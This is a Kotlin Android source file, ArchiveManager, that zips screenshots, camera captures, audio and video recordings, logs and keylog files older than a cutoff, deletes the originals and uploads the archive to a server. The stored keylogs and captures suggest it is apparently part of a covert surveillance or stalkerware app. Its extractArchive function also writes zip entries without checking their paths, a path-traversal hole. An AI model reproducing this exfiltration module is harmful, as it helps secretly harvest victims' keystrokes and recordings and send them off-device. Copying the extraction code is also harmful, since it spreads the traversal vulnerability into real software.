package com.abuzahra.manager.storage

import android.content.Context
import android.util.Log
import com.abuzahra.manager.api.ApiClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipInputStream
import java.util.zip.ZipOutputStream

/**
 * ArchiveManager - Handles data archiving and restoration
 * Compresses old data and manages archive lifecycle
 */
object ArchiveManager {
    
    private const val TAG = "ArchiveManager"
    private const val ARCHIVE_VERSION = 1
    private const val MAX_ARCHIVE_SIZE = 100 * 1024 * 1024 // 100MB
    
    /**
     * Archive status
     */
    enum class ArchiveStatus {
        PENDING,
        ARCHIVING,
        COMPRESSING,
        UPLOADING,
        COMPLETED,
        FAILED
    }
    
    /**
     * Archive data older than specified days
     */
    suspend fun archiveOldData(
        context: Context,
        daysOld: Int = 30,
        compress: Boolean = true,
        uploadToServer: Boolean = true
    ): ArchiveResult = withContext(Dispatchers.IO) {
        try {
            Log.i(TAG, "Archiving data older than $daysOld days")
            
            val cutoffTime = System.currentTimeMillis() - (daysOld * 24 * 60 * 60 * 1000L)
            val timestamp = System.currentTimeMillis()
            val dateStr = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date(timestamp))
            val archiveName = "archive_$dateStr.zip"
            
            val archiveDir = StorageManager.getDirectory(StorageManager.Dir.ARCHIVES)
            val archiveFile = File(archiveDir, archiveName)
            
            var archivedCount = 0
            var archivedSize = 0L
            
            ZipOutputStream(archiveFile.outputStream()).use { zipOut ->
                // Add manifest
                val manifest = JSONObject().apply {
                    put("version", ARCHIVE_VERSION)
                    put("timestamp", timestamp)
                    put("cutoffTime", cutoffTime)
                    put("created", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp)))
                }
                addEntryToZip(zipOut, "manifest.json", manifest.toString())
                
                // Archive old screenshots
                val screenshotsResult = archiveOldFiles(
                    zipOut, 
                    StorageManager.Dir.SCREENSHOTS, 
                    cutoffTime, 
                    "screenshots"
                )
                archivedCount += screenshotsResult.first
                archivedSize += screenshotsResult.second
                
                // Archive old camera captures
                val cameraResult = archiveOldFiles(
                    zipOut, 
                    StorageManager.Dir.CAMERA, 
                    cutoffTime, 
                    "camera"
                )
                archivedCount += cameraResult.first
                archivedSize += cameraResult.second
                
                // Archive old audio recordings
                val audioResult = archiveOldFiles(
                    zipOut, 
                    StorageManager.Dir.AUDIO, 
                    cutoffTime, 
                    "audio"
                )
                archivedCount += audioResult.first
                archivedSize += audioResult.second
                
                // Archive old video recordings
                val videoResult = archiveOldFiles(
                    zipOut, 
                    StorageManager.Dir.VIDEO, 
                    cutoffTime, 
                    "video"
                )
                archivedCount += videoResult.first
                archivedSize += videoResult.second
                
                // Archive old logs
                val logsResult = archiveOldFiles(
                    zipOut, 
                    StorageManager.Dir.LOGS, 
                    cutoffTime, 
                    "logs"
                )
                archivedCount += logsResult.first
                archivedSize += logsResult.second
                
                // Archive old keylog
                val keylogResult = archiveOldFiles(
                    zipOut, 
                    StorageManager.Dir.KEYLOG, 
                    cutoffTime, 
                    "keylog"
                )
                archivedCount += keylogResult.first
                archivedSize += keylogResult.second
            }
            
            Log.i(TAG, "Archive created: $archivedCount files, ${archiveFile.length()} bytes")
            
            // Upload to server if requested
            if (uploadToServer && archiveFile.exists()) {
                try {
                    ApiClient.uploadFile(archiveFile, "archive")
                    Log.i(TAG, "Archive uploaded to server")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to upload archive", e)
                }
            }
            
            ArchiveResult(
                success = true,
                archivePath = archiveFile.absolutePath,
                archiveName = archiveFile.name,
                archiveSize = archiveFile.length(),
                itemsArchived = archivedCount,
                originalSize = archivedSize,
                timestamp = timestamp
            )
        } catch (e: Exception) {
            Log.e(TAG, "Archive failed", e)
            ArchiveResult(
                success = false,
                error = e.message ?: "Archive failed"
            )
        }
    }
    
    /**
     * Archive old files from directory
     */
    private fun archiveOldFiles(
        zipOut: ZipOutputStream,
        dirName: String,
        cutoffTime: Long,
        archivePath: String
    ): Pair<Int, Long> {
        var count = 0
        var totalSize = 0L
        
        val dir = StorageManager.getDirectory(dirName)
        dir.walkTopDown()
            .filter { it.isFile && it.lastModified() < cutoffTime }
            .forEach { file ->
                try {
                    addFileToZip(zipOut, "$archivePath/${file.name}", file)
                    count++
                    totalSize += file.length()
                    
                    // Delete original file after archiving
                    file.delete()
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to archive: ${file.name}", e)
                }
            }
        
        return Pair(count, totalSize)
    }
    
    /**
     * Add entry to zip
     */
    private fun addEntryToZip(zipOut: ZipOutputStream, name: String, content: String) {
        zipOut.putNextEntry(ZipEntry(name))
        zipOut.write(content.toByteArray(Charsets.UTF_8))
        zipOut.closeEntry()
    }
    
    /**
     * Add file to zip
     */
    private fun addFileToZip(zipOut: ZipOutputStream, name: String, file: File) {
        zipOut.putNextEntry(ZipEntry(name))
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var len: Int
            while (input.read(buffer).also { len = it } > 0) {
                zipOut.write(buffer, 0, len)
            }
        }
        zipOut.closeEntry()
    }
    
    /**
     * Extract archive
     */
    suspend fun extractArchive(archiveFile: File, targetDir: File): ExtractResult = withContext(Dispatchers.IO) {
        try {
            Log.i(TAG, "Extracting archive: ${archiveFile.name}")
            
            var extractedCount = 0
            
            ZipInputStream(archiveFile.inputStream()).use { zipIn ->
                var entry: ZipEntry? = zipIn.nextEntry
                
                while (entry != null) {
                    val outputFile = File(targetDir, entry.name)
                    
                    if (entry.isDirectory) {
                        outputFile.mkdirs()
                    } else {
                        outputFile.parentFile?.mkdirs()
                        outputFile.outputStream().use { output ->
                            val buffer = ByteArray(8192)
                            var len: Int
                            while (zipIn.read(buffer).also { len = it } > 0) {
                                output.write(buffer, 0, len)
                            }
                        }
                        extractedCount++
                    }
                    
                    zipIn.closeEntry()
                    entry = zipIn.nextEntry
                }
            }
            
            Log.i(TAG, "Archive extracted: $extractedCount files")
            
            ExtractResult(
                success = true,
                extractedCount = extractedCount,
                targetPath = targetDir.absolutePath
            )
        } catch (e: Exception) {
            Log.e(TAG, "Extract failed", e)
            ExtractResult(
                success = false,
                error = e.message ?: "Extract failed"
            )
        }
    }
    
    /**
     * List archives
     */
    fun listArchives(): List<ArchiveInfo> {
        val archiveDir = StorageManager.getDirectory(StorageManager.Dir.ARCHIVES)
        return archiveDir.listFiles()
            ?.filter { it.extension == "zip" }
            ?.map { file ->
                ArchiveInfo(
                    fileName = file.name,
                    filePath = file.absolutePath,
                    fileSize = file.length(),
                    createdAt = file.lastModified()
                )
            }
            ?.sortedByDescending { it.createdAt }
            ?: emptyList()
    }
    
    /**
     * Get archive statistics
     */
    fun getArchiveStats(): ArchiveStats {
        val archives = listArchives()
        val totalSize = archives.sumOf { it.fileSize }
        
        return ArchiveStats(
            archiveCount = archives.size,
            totalSize = totalSize,
            oldestArchive = archives.minByOrNull { it.createdAt }?.createdAt,
            newestArchive = archives.maxByOrNull { it.createdAt }?.createdAt
        )
    }
    
    /**
     * Delete archive
     */
    fun deleteArchive(fileName: String): Boolean {
        val archiveDir = StorageManager.getDirectory(StorageManager.Dir.ARCHIVES)
        val file = File(archiveDir, fileName)
        return file.exists() && file.delete()
    }
    
    /**
     * Clean old archives
     */
    fun cleanOldArchives(maxAgeDays: Int = 90): Int {
        return StorageManager.cleanOldFiles(StorageManager.Dir.ARCHIVES, maxAgeDays)
    }
    
    /**
     * Verify archive integrity
     */
    suspend fun verifyArchive(archiveFile: File): Boolean = withContext(Dispatchers.IO) {
        try {
            ZipInputStream(archiveFile.inputStream()).use { zipIn ->
                var entry: ZipEntry? = zipIn.nextEntry
                
                // Check for manifest
                var hasManifest = false
                
                while (entry != null) {
                    if (entry.name == "manifest.json") {
                        hasManifest = true
                    }
                    zipIn.closeEntry()
                    entry = zipIn.nextEntry
                }
                
                hasManifest
            }
        } catch (e: Exception) {
            Log.e(TAG, "Archive verification failed", e)
            false
        }
    }
    
    data class ArchiveResult(
        val success: Boolean,
        val archivePath: String? = null,
        val archiveName: String? = null,
        val archiveSize: Long = 0,
        val itemsArchived: Int = 0,
        val originalSize: Long = 0,
        val timestamp: Long = 0,
        val error: String? = null
    )
    
    data class ExtractResult(
        val success: Boolean,
        val extractedCount: Int = 0,
        val targetPath: String? = null,
        val error: String? = null
    )
    
    data class ArchiveInfo(
        val fileName: String,
        val filePath: String,
        val fileSize: Long,
        val createdAt: Long
    )
    
    data class ArchiveStats(
        val archiveCount: Int,
        val totalSize: Long,
        val oldestArchive: Long?,
        val newestArchive: Long?
    )
}
